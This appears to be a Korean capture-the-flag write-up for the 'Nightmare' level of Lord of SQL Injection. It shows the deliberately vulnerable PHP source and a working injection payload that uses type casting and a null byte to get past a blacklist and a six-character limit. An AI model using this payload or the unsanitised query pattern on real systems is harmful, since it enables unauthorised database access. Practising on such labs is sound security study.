# Lord of SQL Injection No.18 Nightmare



Nightmare 문제는 문자열 길이 제한을 지키면서 필요없는 부분을 무력화시킬 수 있는지 알아보기 위한 문제이다.



## 소스 코드

```php

<?php

  include "./config.php"; 

  login_chk(); 

  dbconnect(); 

  if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 

  if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 

  $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 

  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 

  $result = @mysql_fetch_array(mysql_query($query)); 

  if($result['id']) solve("nightmare"); 

  highlight_file(__FILE__); 

?>

```



```php

if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~");

```



`preg_match`에서 `prob`, `_`, `.`, `()`, `#`, `-`를 필터링하면 `No Hack ~_~` 을 출력한 후 문제 풀이에 실패하게 된다.



```php

$query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'";

```



`pw`를 입력받은 후 `and !='admin'`을 통해 `id`값이 `admin`이 아니면 항상 거짓을 반환하게 한다.



#### 문제 풀이 조건



```php

if($result['id']) solve("nightmare"); 

```



`id`값이 존재하기만 하면 문제 풀이에 성공하게 된다.



## Solution



```

http://los.eagle-jump.org/nightmare_***.php?pw=%27)=0;%00

```



`pw`문이 `()`로 갇혀있기 때문에 이를 이용하여 `MySQL Auto Casting` 을 유도하면 문자가 숫자로 시작하지 않아 0을 반환하게 되고

`0=0`은 항상 참이기 때문에 모든 `pw`절을 불러올 수 있게 되고 문제 풀이에 성공하게 된다.